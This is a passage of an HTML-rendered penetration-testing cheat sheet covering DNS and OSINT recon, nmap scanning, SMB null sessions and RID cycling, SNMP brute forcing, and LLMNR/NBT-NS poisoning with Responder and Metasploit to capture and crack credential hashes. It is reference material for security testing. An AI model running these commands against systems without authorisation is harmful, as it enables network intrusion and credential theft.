      &lt;li&gt;&lt;a href=&quot;#spawn-tty-shell-from-vi&quot; id=&quot;markdown-toc-spawn-tty-shell-from-vi&quot;&gt;Spawn TTY Shell from Vi&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spawn-tty-shell-nmap&quot; id=&quot;markdown-toc-spawn-tty-shell-nmap&quot;&gt;Spawn TTY Shell NMAP&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#metasploit-cheat-sheet&quot; id=&quot;markdown-toc-metasploit-cheat-sheet&quot;&gt;Metasploit Cheat Sheet&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#meterpreter-payloads&quot; id=&quot;markdown-toc-meterpreter-payloads&quot;&gt;Meterpreter Payloads&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#windows-reverse-meterpreter-payload&quot; id=&quot;markdown-toc-windows-reverse-meterpreter-payload&quot;&gt;Windows reverse meterpreter payload&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#windows-vnc-meterpreter-payload&quot; id=&quot;markdown-toc-windows-vnc-meterpreter-payload&quot;&gt;Windows VNC Meterpreter payload&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-reverse-meterpreter-payload&quot; id=&quot;markdown-toc-linux-reverse-meterpreter-payload&quot;&gt;Linux Reverse Meterpreter payload&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#meterpreter-cheat-sheet&quot; id=&quot;markdown-toc-meterpreter-cheat-sheet&quot;&gt;Meterpreter Cheat Sheet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#common-metasploit-modules&quot; id=&quot;markdown-toc-common-metasploit-modules&quot;&gt;Common Metasploit Modules&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#remote-windows-metasploit-modules-exploits&quot; id=&quot;markdown-toc-remote-windows-metasploit-modules-exploits&quot;&gt;Remote Windows Metasploit Modules (exploits)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#local-windows-metasploit-modules-exploits&quot; id=&quot;markdown-toc-local-windows-metasploit-modules-exploits&quot;&gt;Local Windows Metasploit Modules (exploits)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#auxilary-metasploit-modules&quot; id=&quot;markdown-toc-auxilary-metasploit-modules&quot;&gt;Auxilary Metasploit Modules&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#metasploit-powershell-modules&quot; id=&quot;markdown-toc-metasploit-powershell-modules&quot;&gt;Metasploit Powershell Modules&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#post-exploit-windows-metasploit-modules&quot; id=&quot;markdown-toc-post-exploit-windows-metasploit-modules&quot;&gt;Post Exploit Windows Metasploit Modules&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ascii-table-cheat-sheet&quot; id=&quot;markdown-toc-ascii-table-cheat-sheet&quot;&gt;ASCII Table Cheat Sheet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#cisco-ios-commands&quot; id=&quot;markdown-toc-cisco-ios-commands&quot;&gt;CISCO IOS Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#cryptography&quot; id=&quot;markdown-toc-cryptography&quot;&gt;Cryptography&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#hash-lengths&quot; id=&quot;markdown-toc-hash-lengths&quot;&gt;Hash Lengths&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#hash-examples&quot; id=&quot;markdown-toc-hash-examples&quot;&gt;Hash Examples&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sqlmap-examples&quot; id=&quot;markdown-toc-sqlmap-examples&quot;&gt;SQLMap Examples&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pre-engagement&quot;&gt;Pre-engagement&lt;/h2&gt;

&lt;h3 id=&quot;network-configuration&quot;&gt;Network Configuration&lt;/h3&gt;

&lt;h4 id=&quot;set-ip-address&quot;&gt;Set IP Address&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig eth0 xxx.xxx.xxx.xxx/24 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;subnetting&quot;&gt;Subnetting&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;osint&quot;&gt;OSINT&lt;/h2&gt;

&lt;h3 id=&quot;passive-information-gathering&quot;&gt;Passive Information Gathering&lt;/h3&gt;

&lt;h4 id=&quot;dns&quot;&gt;DNS&lt;/h4&gt;

&lt;h5 id=&quot;whois-enumeration&quot;&gt;WHOIS enumeration&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whois domain-name-here.com 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;perform-dns-ip-lookup&quot;&gt;Perform DNS IP Lookup&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dig a domain-name-here.com @nameserver 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;perform-mx-record-lookup&quot;&gt;Perform MX Record Lookup&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dig mx domain-name-here.com @nameserver
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;perform-zone-transfer-with-dig&quot;&gt;Perform Zone Transfer with DIG&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dig axfr domain-name-here.com @nameserver
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;dns-zone-transfers&quot;&gt;DNS Zone Transfers&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
   &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nslookup -&amp;gt; set type=any -&amp;gt; ls -d blah.com&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Windows DNS zone transfer&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dig axfr blah.com @ns1.blah.com&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Linux DNS zone transfer&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;email&quot;&gt;Email&lt;/h4&gt;

&lt;h5 id=&quot;simply-email&quot;&gt;Simply Email&lt;/h5&gt;

&lt;p&gt;Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn’t think you’re a robot and make you fill out a Captcha.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Simply Email can verify the discovered email addresss after gathering.&lt;/p&gt;

&lt;h3 id=&quot;semi-active-information-gathering&quot;&gt;Semi Active Information Gathering&lt;/h3&gt;

&lt;h4 id=&quot;basic-finger-printing&quot;&gt;Basic Finger Printing&lt;/h4&gt;

&lt;p&gt;Manual finger printing / banner grabbing.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
   &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nc -v 192.168.1.1 25&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;telnet 192.168.1.1 25&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Basic versioning / finger printing via displayed banner&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;banner-grabbing-with-nc&quot;&gt;Banner grabbing with NC&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
&amp;lt;enter&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;active-information-gathering&quot;&gt;Active Information Gathering&lt;/h3&gt;

&lt;h4 id=&quot;dns-bruteforce&quot;&gt;DNS Bruteforce&lt;/h4&gt;

&lt;h5 id=&quot;dnsrecon&quot;&gt;DNSRecon&lt;/h5&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;DNS Enumeration Kali - DNSRecon&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml&lt;/span&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h4 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h4&gt;

&lt;h5 id=&quot;nmap-commands&quot;&gt;Nmap Commands&lt;/h5&gt;

&lt;p&gt;For more commands, see the Nmap cheat sheet (link in the menu on the right).&lt;/p&gt;

&lt;p&gt;Basic Nmap Commands:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -sS -A -T4 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

        &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -sS -p--A -T4 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;As above but scans all TCP ports (takes a lot longer)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -sU -sS -p- -A -T4 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;As above but scans all TCP ports and UDP scan (takes even longer)&lt;/p&gt;
      &lt;/td&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -p 445 --script=smb-check-vulns &lt;br /&gt;--script-args=unsafe=1 192.168.1.X&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ls /usr/share/nmap/scripts/* | grep ftp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Search nmap scripts for keywords&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
  &lt;/table&gt;
  &lt;/div&gt;

&lt;p&gt;I’ve had a few people mention about T4 scans, apply common sense here. Don’t use T4 commands on external pen tests (when using an Internet connection), you’re probably better off using a T2 with a TCP connect scan. A T4 scan would likely be better suited for an internal pen test, over low latency links with plenty of bandwidth. But it all depends on the target devices, embeded devices are going to struggle if you T4 / T5 them and give inconclusive results. As a general rule of thumb, scan as slowly as you can, or do a fast scan for the top 1000 so you can start pen testing then kick off a slower scan.&lt;/p&gt;

&lt;h6 id=&quot;nmap-udp-scanning&quot;&gt;Nmap UDP Scanning&lt;/h6&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sU TARGET 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;udp-protocol-scanner&quot;&gt;UDP Protocol Scanner&lt;/h6&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/portcullislabs/udp-proto-scanner.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Scan a file of IP addresses for all services:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./udp-protocol-scanner.pl -f ip.txt 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Scan for a specific UDP service:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;udp-proto-scanner.pl -p ntp -f ips.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;other-host-discovery&quot;&gt;Other Host Discovery&lt;/h6&gt;

&lt;p&gt;Other methods of host discovery, that don’t use nmap…&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;netdiscover -r 192.168.1.0/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site&lt;/p&gt;
      &lt;/td&gt;

    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;enumeration--attacking-network-services&quot;&gt;Enumeration &amp;amp; Attacking Network Services&lt;/h2&gt;

&lt;p&gt;Penetration testing tools that spefically identify and / or enumerate network services:&lt;/p&gt;

&lt;h3 id=&quot;samb--smb--windows-domain-enumeration&quot;&gt;SAMB / SMB / Windows Domain Enumeration&lt;/h3&gt;

&lt;h4 id=&quot;samba-enumeration&quot;&gt;Samba Enumeration&lt;/h4&gt;

&lt;h5 id=&quot;smb-enumeration-tools&quot;&gt;SMB Enumeration Tools&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U &quot;&quot; target
enum4linux target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also see, nbtscan cheat sheet (right hand menu).&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
  &lt;table&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Command&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
        &lt;tbody&gt;
        &lt;tr&gt;
        &lt;td&gt;
          &lt;p&gt;&lt;code&gt;nbtscan 192.168.1.0/24&lt;/code&gt;&lt;/p&gt;
        &lt;/td&gt;
        &lt;td&gt;&lt;p&gt;Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain&lt;/p&gt;&lt;/td&gt;
      &lt;/tr&gt;

       &lt;tr&gt;
        &lt;td&gt;
          &lt;p&gt;&lt;code&gt;enum4linux -a target-ip&lt;/code&gt;&lt;/p&gt;
        &lt;/td&gt;
        &lt;td&gt;
              &lt;p&gt;Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing&lt;/p&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
  &lt;/div&gt;

&lt;h5 id=&quot;fingerprint-smb-version&quot;&gt;Fingerprint SMB Version&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L //192.168.1.100 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;find-open-smb-shares&quot;&gt;Find open SMB Shares&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;enumerate-smb-users&quot;&gt;Enumerate SMB Users&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;RID Cycling:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Metasploit module for RID cycling:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use auxiliary/scanner/smb/smb_lookupsid
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;manual-null-session-testing&quot;&gt;Manual Null session testing:&lt;/h5&gt;

&lt;p&gt;Windows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net use \\TARGET\IPC$ &quot;&quot; /u:&quot;&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Linux:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L //192.168.99.131
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;nbtscan-unixwiz&quot;&gt;NBTScan unixwiz&lt;/h5&gt;

&lt;p&gt;Install on Kali rolling:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install nbtscan-unixwiz 
nbtscan-unixwiz -f 192.168.0.1-254 &amp;gt; nbtscan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;llmnr--nbt-ns-spoofing&quot;&gt;LLMNR / NBT-NS Spoofing&lt;/h3&gt;

&lt;p&gt;Steal credentials off the network.&lt;/p&gt;

&lt;h5 id=&quot;metasploit-llmnr--netbios-requests&quot;&gt;Metasploit LLMNR / NetBIOS requests&lt;/h5&gt;

&lt;p&gt;Spoof / poison LLMNR / NetBIOS requests:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Capture the hashes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You’ll end up with NTLMv2 hash, use john or hashcat to crack it.&lt;/p&gt;

&lt;h4 id=&quot;responderpy&quot;&gt;Responder.py&lt;/h4&gt;

&lt;p&gt;Alternatively you can use responder.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/SpiderLabs/Responder.git
python Responder.py -i local-ip -I eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Run Responder.py for the whole engagement&lt;/h5&gt;
  &lt;p&gt;Run Responder.py for the length of the engagement while you're working on other attack vectors.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;snmp-enumeration-tools&quot;&gt;SNMP Enumeration Tools&lt;/h3&gt;

&lt;p&gt;A number of SNMP enumeration tools.&lt;/p&gt;

&lt;p&gt;Fix SNMP output values so they are human readable:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install snmp-mibs-downloader download-mibs
echo &quot;&quot; &amp;gt; /etc/snmp/snmp.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;snmpcheck -t 192.168.1.X -c public&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;snmpwalk -c public -v1 192.168.1.X 1| &lt;br /&gt; grep hrSWRunName|cut -d* * -f &lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;snmpenum -t 192.168.1.X&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;onesixtyone -c names -i hosts&lt;/code&gt;&lt;/p&gt;  
      &lt;/td&gt;
      &lt;td&gt;SNMP enumeration&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;snmpv3-enumeration-tools&quot;&gt;SNMPv3 Enumeration Tools&lt;/h4&gt;

&lt;p&gt;Idenitfy SNMPv3 servers with nmap:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Use Metasploits Wordlist&lt;/h5&gt;
  &lt;p&gt;Metasploit's wordlist (KALI path below) has common credentials for v1 &amp;amp; 2 of SNMP, for newer credentials check out Daniel Miessler's SecLists project on GitHub (not the mailing list!).&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;r-services-enumeration&quot;&gt;R Services Enumeration&lt;/h3&gt;

&lt;p&gt;This is legacy, included for completeness.&lt;/p&gt;

&lt;p&gt;nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:&lt;/p&gt;

&lt;h4 id=&quot;rsh-enumeration&quot;&gt;RSH Enumeration&lt;/h4&gt;
&lt;h5 id=&quot;rsh-run-commands&quot;&gt;RSH Run Commands&lt;/h5&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rsh &amp;lt;target&amp;gt; &amp;lt;command&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;metasploit-rsh-login-scanner&quot;&gt;Metasploit RSH Login Scanner&lt;/h5&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/scanner/rservices/rsh_login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;rusers-show-logged-in-users&quot;&gt;rusers Show Logged in Users&lt;/h5&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rusers -al 192.168.2.1
